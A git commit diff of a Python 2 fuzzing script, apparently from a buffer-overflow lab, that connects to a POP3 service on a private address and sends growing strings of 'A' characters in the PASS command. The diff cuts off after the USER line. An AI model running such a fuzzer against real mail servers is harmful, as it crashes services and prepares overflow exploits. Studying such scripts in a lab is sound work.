449175a13a7472edab28debef675932b59836419
zHeadCrusher <67909733+zHeadCrusher@users.noreply.github.com>
2020-08-20 19:06:57 -0300

    Update fuzzing.py

--- fuzzing.py
+++ fuzzing.py
@@ -1,16 +1,16 @@
 #!/usr/bin/python
 import socket
 
-buffer=["A"]
+buffer=["A"] 	#caracter que sera enviado
 contador=100
-while len(buffer) <= 30:
+while len(buffer) <= 100:
 	buffer.append("A"*contador)
-	contador=contador+200
+	contador=contador+200 #vai enviar de 200 em 200 bytes / startando em 100
 
 for string in buffer:
-	print "Fuzzing em PASS com %s bytes" %len(string)
+	print "Fuzzing em PASS com %s bytes" %len(string)  #dessa forma ele nao mostra todos os A's na tela, a saida fica melhor
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(("host",110))
+	s.connect(("192.168.2.140",110))
 	s.recv(1024)
 	s.send('USER usuario\r\n')
 	s.recv(1024)
